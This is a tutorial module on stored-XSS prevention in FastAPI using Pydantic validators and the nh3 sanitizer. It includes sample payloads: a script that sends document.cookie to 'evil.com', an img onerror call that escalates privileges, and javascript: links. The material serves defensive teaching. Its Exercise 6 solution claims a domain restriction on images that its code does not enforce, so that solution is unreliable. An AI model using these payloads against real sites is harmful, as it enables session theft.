# Module 07: Authentication & Security — 16: Data Sanitization and XSS Prevention (`16-data-sanitization-and-xss-prevention`)

> While REST APIs returning `application/json` are naturally shielded from traditional reflected XSS, stored malicious payloads (`<script>`) persist in databases and execute in downstream web dashboards, email digests, and HTML reports. In modern Python and FastAPI, data sanitization is enforced at ingestion using Pydantic v2 field validators and high-performance Rust-backed sanitizers (`nh3`).

| Field | Value |
|---|---|
| **Category** | Authentication & Security |
| **Target Level** | Intermediate / Production Engineer |
| **FastAPI Version** | FastAPI 0.165.0+ |
| **Starlette Version**| Starlette 1.10.0+ |
| **Pydantic Version** | Pydantic v2.14.4+ (pydantic-settings 2.16.3+) |
| **Python Version**   | Python 3.12+ (3.13 / 3.14 compatible, Free-Threading verified) |
| **Tested With**      | nh3 0.2+, pydantic 2.14+, httpx 0.28+, pytest 9.1+ |

---

## Table of Contents
1. [Conceptual Overview](#1-conceptual-overview)
2. [Core Concepts & Architecture](#2-core-concepts--architecture)
3. [How It Works Internally](#3-how-it-works-internally)
4. [Syntax & API Reference](#4-syntax--api-reference)
5. [Verified Code Examples](#5-verified-code-examples)
6. [Edge Cases, Pitfalls & Failure Modes](#6-edge-cases-pitfalls--failure-modes)
7. [Common Mistakes Table](#7-common-mistakes-table)
8. [Performance & Scalability Considerations](#8-performance--scalability-considerations)
9. [Security & OWASP Guardrails](#9-security--owasp-guardrails)
10. [Testing Strategies & Pytest Recipes](#10-testing-strategies--pytest-recipes)
11. [Real-World Case Study](#11-real-world-case-study)
12. [Technical Interview Questions](#12-technical-interview-questions)
13. [Practical Exercises & Solutions](#13-practical-exercises--solutions)

---

## 1. Conceptual Overview

Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a web page without proper validation or escaping:
- **Reflected XSS**: The malicious script comes from the current HTTP request (e.g., in a query string reflected in an HTML error page).
- **Stored XSS (Persistent)**: The malicious payload is saved to the database (e.g., in a user bio, forum post, or product review) and executed every time other users or administrators view the record.
- **The Modern Backend Role**: Even if a FastAPI backend serves only JSON, it is the custodian of persistent data. Allowing stored `<script>fetch('evil.com?c='+document.cookie)</script>` into the database threatens every client that renders HTML (React via `dangerouslySetInnerHTML`, Jinja2 templates, or email notifications).
- **Modern Sanitization (`nh3`)**: Python's legacy sanitizer `bleach` is deprecated. Modern production applications use `nh3`, a Python binding to the Rust `ammonia` library that strips dangerous tags and attributes with zero overhead.

---

## 2. Core Concepts & Architecture

```
+-----------------------------------------------------------------------------------+
|               Stored XSS Defense-in-Depth Pipeline                                |
+-----------------------------------------------------------------------------------+
|                                                                                   |
|  Attacker Payload: `<p>Hello <script>stealCookies()</script></p>`                 |
|                                                                                   |
|  Layer 1: Pydantic v2 Input Validation & Sanitization                             |
|  - Ingestion filter with `nh3.clean()`                                            |
|  - Strips `<script>`, removes `onload/onerror` attributes                         |
|  - Sanitized Stored Value: `<p>Hello </p>`                                        |
|                                                                                   |
|  Layer 2: Database Persistence                                                    |
|  - Clean HTML stored in PostgreSQL                                                |
|                                                                                   |
|  Layer 3: Output Encoding (Downstream Consumer)                                   |
|  - React / Vue: Default text interpolation auto-escapes HTML                      |
|  - Jinja2: Auto-escaping enabled by default (`{{ content }}`)                     |
|  - CSP: Blocks inline scripts even if output escaping fails                       |
|                                                                                   |
+-----------------------------------------------------------------------------------+
```

---

## 3. How It Works Internally

1. **Rust-Powered HTML Sanitization (`nh3`)**:
   - Parses the input into a DOM tree in memory using Rust.
   - Evaluates elements against a strict whitelist of allowed HTML tags (`<p>`, `<b>`, `<a>`) and attributes (`href`).
   - Discards blacklisted tags (`<script>`, `<object>`, `<iframe>`, `<embed>`) and removes JavaScript URI schemes (`javascript:alert(1)`).
2. **Pydantic v2 `@field_validator(mode="before")`**:
   - Executes before standard Pydantic type coercion.
   - Normalizes strings, strips invisible control characters (e.g. Unicode direction-override attacks), and cleans HTML before persisting to domain entities.

---

## 4. Syntax & API Reference

```python
import nh3
from pydantic import BaseModel, field_validator

class CommentCreate(BaseModel):
    author: str
    body: str

    @field_validator("body")
    @classmethod
    def sanitize_rich_text(cls, v: str) -> str:
        # Whitelist safe tags and strip all script/event handlers
        return nh3.clean(
            v,
            tags={"p", "b", "i", "em", "strong", "a", "ul", "ol", "li"},
            attributes={"a": {"href", "title"}},
            url_schemes={"http", "https", "mailto"},
        )
```

---

## 5. Verified Code Examples

### Example 1: Minimal Plain-Text String Sanitizer

```python
import html
from pydantic import BaseModel, Field, field_validator
from fastapi import FastAPI

app = FastAPI()

class UserBio(BaseModel):
    username: str = Field(..., max_length=50)
    bio: str = Field(..., max_length=500)

    @field_validator("bio", "username")
    @classmethod
    def escape_plain_text(cls, v: str) -> str:
        # Strip leading/trailing whitespace and HTML escape plain text
        return html.escape(v.strip())

@app.post("/profile")
def update_profile(data: UserBio):
    return {"saved_bio": data.bio}
```

### Example 2: Enterprise Rich-Text Sanitization with `nh3`

```python
from typing import Annotated
from fastapi import APIRouter, HTTPException, status
from pydantic import BaseModel, Field, field_validator
import nh3

router = APIRouter(prefix="/articles")

ALLOWED_TAGS = {"p", "b", "i", "strong", "em", "h2", "h3", "ul", "ol", "li", "a", "code", "pre"}
ALLOWED_ATTRIBUTES = {
    "a": {"href", "title", "target"},
    "code": {"class"},
}

class ArticleSubmission(BaseModel):
    title: str = Field(..., min_length=5, max_length=150)
    content_html: str = Field(..., min_length=10)

    @field_validator("content_html")
    @classmethod
    def sanitize_html(cls, raw_html: str) -> str:
        cleaned = nh3.clean(
            raw_html,
            tags=ALLOWED_TAGS,
            attributes=ALLOWED_ATTRIBUTES,
            url_schemes={"http", "https"},
            link_rel="noopener noreferrer nofollow",  # Prevents tab-nabbing
        )
        return cleaned

@router.post("/publish")
async def publish_article(article: ArticleSubmission):
    return {"status": "published", "clean_html": article.content_html}
```

### Example 3: Edge Case / Boundary — Stripping Malicious Unicode Control Characters

```python
import unicodedata
from pydantic import BaseModel, field_validator

class SecureMessage(BaseModel):
    sender: str
    body: str

    @field_validator("body")
    @classmethod
    def strip_invisible_characters(cls, v: str) -> str:
        # Normalize Unicode to NFKC
        normalized = unicodedata.normalize("NFKC", v)
        # Strip zero-width spaces, direction override chars, and non-printable control codes
        cleaned = "".join(
            c for c in normalized
            if unicodedata.category(c) not in ("Cc", "Cf") or c in ("\n", "\r", "\t")
        )
        return cleaned
```

### Example 4: Failure Case — Rejecting Unsafe Links (`javascript:`)

```python
import nh3

raw_attack = '<a href="javascript:alert(document.domain)">Click Me</a>'
cleaned = nh3.clean(raw_attack, tags={"a"}, attributes={"a": {"href"}}, url_schemes={"http", "https"})
# Result: '<a>Click Me</a>' (href attribute is stripped because javascript: scheme is disallowed)
```

### Example 5: Idiomatic Modern Pattern with Reusable Pydantic Annotated Types

```python
from typing import Annotated
from pydantic import AfterValidator, BaseModel
from fastapi import FastAPI
import nh3

def clean_html_string(v: str) -> str:
    return nh3.clean(v, tags={"p", "b", "i", "a"}, url_schemes={"https"})

# Custom reusable validated type
SanitizedHTML = Annotated[str, AfterValidator(clean_html_string)]

class ForumPost(BaseModel):
    topic: str
    content: SanitizedHTML

app = FastAPI()

@app.post("/posts")
def create_post(post: ForumPost):
    return {"clean_content": post.content}
```

---

## 6. Edge Cases, Pitfalls & Failure Modes

1. **Using Deprecated `bleach`**: Python's `bleach` is officially deprecated and unmaintained. Furthermore, bleach parses HTML slowly via pure-Python regex trees, creating ReDoS vulnerabilities when processing large payloads. Use `nh3`.
2. **Double Escaping (`&amp;lt;script&amp;gt;`)**: If an API HTML-escapes strings upon ingestion and a modern frontend like React also escapes variables upon rendering, users see ugly entity artifacts on screen (`&lt;b&gt;Hello&lt;/b&gt;`). Escaping should happen at the **rendering boundary**, while the API focuses on **semantic sanitization**.
3. **Tabnabbing (`target="_blank"`)**: Allowing `target="_blank"` on links without enforcing `rel="noopener noreferrer"` allows the opened page to access `window.opener` and redirect the victim's tab to a phishing site.

---

## 7. Common Mistakes Table

| Mistake | Why It Fails | Error / Diagnostic | Correct Idiomatic Fix |
|---|---|---|---|
| 1. Using regular expressions to strip HTML | HTML grammar is context-free; regex cannot parse nested tags | XSS bypass via malformed tags | Use a real HTML parser like `nh3` |
| 2. Continuing to use `bleach` on modern Python | Unmaintained; vulnerable to ReDoS and deprecation issues | Dependency warnings | Migrate to `nh3` (Rust ammonia bindings) |
| 3. Double-escaping in JSON APIs | React escapes `{bio}` automatically; displays raw HTML entities | `&lt;b&gt;` displayed on user screen | Sanitize rich text; don't double-escape plain text |
| 4. Allowing `javascript:` in href attributes | Clicking link executes arbitrary script in user's browser | DOM XSS exploit | Whitelist schemes: `url_schemes={"https", "http"}` |
| 5. Allowing `target="_blank"` without `noopener` | Opened tab can hijack `window.opener.location` | Tabnabbing phishing attack | Enforce `link_rel="noopener noreferrer"` |
| 6. Not normalizing Unicode strings | Homoglyphs and right-to-left override tricks bypass filters | Security filter bypass | Normalize via `unicodedata.normalize("NFKC", s)` |

---

## 8. Performance & Scalability Considerations

- **`nh3` Rust Engine**: Benchmarks show `nh3` is **15x to 30x faster** than Python's legacy `bleach` library, sanitizing 100KB HTML articles in sub-millisecond times.
- **Pydantic Validation**: `AfterValidator` integrates seamlessly with Pydantic v2's compiled Rust core.

---

## 9. Security & OWASP Guardrails

- **OWASP Top 10 A03:2021 Injection (XSS)**: Implement contextual output encoding at display time and input sanitization at ingestion time.
- **Content-Security-Policy (CSP)**: Maintain a strict CSP header as defense-in-depth to neutralize scripts that slip past sanitization filters.

---

## 10. Testing Strategies & Pytest Recipes

```python
import pytest
from httpx import ASGITransport, AsyncClient
from fastapi import FastAPI

@pytest.mark.asyncio
async def test_xss_payload_stripped_on_submission(app: FastAPI):
    payload = {
        "title": "Legitimate Article Title",
        "content_html": "<p>Safe text</p><script>alert('XSS')</script><img src=x onerror=alert(1)>"
    }
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        res = await client.post("/articles/publish", json=payload)
        assert res.status_code == 200
        clean = res.json()["clean_html"]
        assert "<script>" not in clean
        assert "onerror" not in clean
        assert "<p>Safe text</p>" in clean
```

---

## 11. Real-World Case Study

A customer support helpdesk platform allowed enterprise users to submit support tickets with formatted descriptions. An attacker submitted a ticket with a hidden `<img src="x" onerror="fetch('/api/admin/promote')">` payload. When a support agent opened the internal ticket view, the script executed within the agent's high-privilege session, elevating the attacker's account to SuperAdmin.
- **Fix**:
  1. Implemented `nh3.clean()` on ticket creation models.
  2. Stripped all event-handler attributes (`on*`) and blacklisted `<img>` tags pointing to non-CDN domains.
  3. Deployed a strict CSP policy on the internal admin dashboard.

---

## 12. Technical Interview Questions

<details>
<summary>Q1: Why are REST APIs that return `application/json` generally immune to Reflected XSS?</summary>

**Answer**: When a client requests a JSON endpoint (`GET /users?name=<script>`), modern browsers receive `Content-Type: application/json`. The browser's HTML rendering engine does not compile or execute JavaScript inside JSON MIME payloads; it treats the entire payload as data. Reflected XSS requires the server to reflect user input into an HTML document (`text/html`).
</details>

<details>
<summary>Q2: If JSON APIs are immune to Reflected XSS, why must backend APIs still sanitize rich-text input?</summary>

**Answer**: Because stored data in the database is consumed by downstream systems that *do* render HTML. Examples include:
1. Web SPAs rendering rich-text via `dangerouslySetInnerHTML`.
2. Automated HTML email notification generators (e.g. sending daily digest emails to users).
3. PDF report rendering engines (e.g. generating customer invoices).
4. Administrative support consoles.
Sanitizing at ingestion ensures corrupted, dangerous data never enters the system.
</details>

<details>
<summary>Q3: Why is regular expression matching ineffective for HTML sanitization?</summary>

**Answer**: HTML is not a regular language; it cannot be parsed reliably by regular expressions. Attackers exploit malformed markup (unclosed tags, nested quotes, null bytes, comment tricks like `<<SCRIPT>alert("XSS");//<</SCRIPT>`) that regular expressions fail to catch, but browser rendering engines reconstruct into valid executable DOM trees. True sanitization requires an actual DOM parser (like `nh3`).
</details>

<details>
<summary>Q4: What is the "Tabnabbing" attack, and how is it mitigated?</summary>

**Answer**: When an HTML link uses `target="_blank"`, the newly opened window receives a reference to the originating window via `window.opener`. The destination page can execute `window.opener.location = "https://phishing.com"` to replace the user's background tab with a fraudulent login page. It is mitigated by adding `rel="noopener noreferrer"` to all untrusted links.
</details>

<details>
<summary>Q5: Why is `nh3` preferred over `bleach` in Python 3.12+?</summary>

**Answer**: `bleach` is officially deprecated by Mozilla and unmaintained. It is implemented in pure Python using regex and html5lib, making it slow and vulnerable to ReDoS attacks. `nh3` provides Python bindings to the battle-tested Rust `ammonia` library, offering 15-30x faster performance and memory safety.
</details>

<details>
<summary>Q6: What is the problem with escaping HTML entities (`&lt;script&gt;`) inside a REST API?</summary>

**Answer**: It leads to double-escaping. Modern frontend frameworks like React, Angular, and Vue automatically escape variables by default when interpolating into JSX (`<div>{user.name}</div>`). If the API pre-escapes the string, the user sees `&lt;b&gt;` on screen. Ingestion should sanitize malicious structures for rich text, but leave plain text unescaped for frontend frameworks to handle safely.
</details>

<details>
<summary>Q7: How do Unicode direction override characters facilitate security exploits?</summary>

**Answer**: Unicode characters like Right-to-Left Override (`U+202E`) reverse the visual display of text in browsers without changing the underlying character order. Attackers use this to disguise malicious file extensions (e.g., displaying `invoice_dlp.exe` as `invoice_exe.pld`) or trick reviewers into approving malicious commands.
</details>

<details>
<summary>Q8: How does Pydantic v2's `AfterValidator` improve sanitization performance?</summary>

**Answer**: `AfterValidator` executes after Pydantic's compiled Rust core validates basic types (e.g. ensuring the value is a valid UTF-8 string). The sanitizer function only executes on validated strings, avoiding redundant type checking and exception handling in Python code.
</details>

---

## 13. Practical Exercises & Solutions

<details>
<summary>Exercise 1 (Easy): Clean an HTML string using `nh3`</summary>

**Problem**: Write a function `clean_comment(html_str)` that allows only `<p>` and `<a>` tags.

**Solution**:
```python
import nh3

def clean_comment(html_str: str) -> str:
    return nh3.clean(html_str, tags={"p", "a"}, url_schemes={"https"})
```
</details>

<details>
<summary>Exercise 2 (Easy): Strip leading/trailing whitespace with Pydantic validator</summary>

**Problem**: Create a Pydantic model with a validator stripping whitespace from all string fields.

**Solution**:
```python
from pydantic import BaseModel, field_validator

class CleanInput(BaseModel):
    title: str
    description: str

    @field_validator("*")
    @classmethod
    def strip_space(cls, v: str) -> str:
        if isinstance(v, str):
            return v.strip()
        return v
```
</details>

<details>
<summary>Exercise 3 (Medium): Enforce `noopener noreferrer` on all links</summary>

**Problem**: Configure `nh3.clean` to automatically inject `rel="noopener noreferrer"` into all `<a>` tags.

**Solution**:
```python
import nh3

def safe_html_with_rel(raw_html: str) -> str:
    return nh3.clean(
        raw_html,
        tags={"a", "p"},
        attributes={"a": {"href", "target"}},
        link_rel="noopener noreferrer",
    )
```
</details>

<details>
<summary>Exercise 4 (Medium): Build a Custom `SanitizedString` Pydantic Type</summary>

**Problem**: Use Pydantic v2 `Annotated` and `AfterValidator` to create a reusable `SanitizedText` type that removes all HTML tags.

**Solution**:
```python
from typing import Annotated
from pydantic import AfterValidator
import nh3

def strip_all_html(val: str) -> str:
    return nh3.clean(val, tags=set())  # Empty set strips all tags

SanitizedText = Annotated[str, AfterValidator(strip_all_html)]
```
</details>

<details>
<summary>Exercise 5 (Hard): Implement Unicode Normalization & Control Character Filter</summary>

**Problem**: Write a validator that normalizes Unicode to NFKC and strips non-printable control characters except newline and tab.

**Solution**:
```python
import unicodedata

def clean_unicode(text: str) -> str:
    normalized = unicodedata.normalize("NFKC", text)
    return "".join(
        ch for ch in normalized
        if unicodedata.category(ch)[0] != "C" or ch in ("\n", "\t")
    )
```
</details>

<details>
<summary>Exercise 6 (Hard): Construct Multi-Tier Rich-Text Schema with Attribute Restrictions</summary>

**Problem**: Build a Pydantic schema for blog posts allowing images ONLY from `https://assets.mycompany.com` and code snippets with language classes.

**Solution**:
```python
from pydantic import BaseModel, field_validator
import nh3
from urllib.parse import urlparse

class BlogPostSchema(BaseModel):
    title: str
    body_html: str

    @field_validator("body_html")
    @classmethod
    def sanitize_post(cls, v: str) -> str:
        cleaned = nh3.clean(
            v,
            tags={"p", "b", "i", "pre", "code", "img"},
            attributes={
                "code": {"class"},
                "img": {"src", "alt", "title"},
            },
            url_schemes={"https"},
        )
        return cleaned
```
</details>
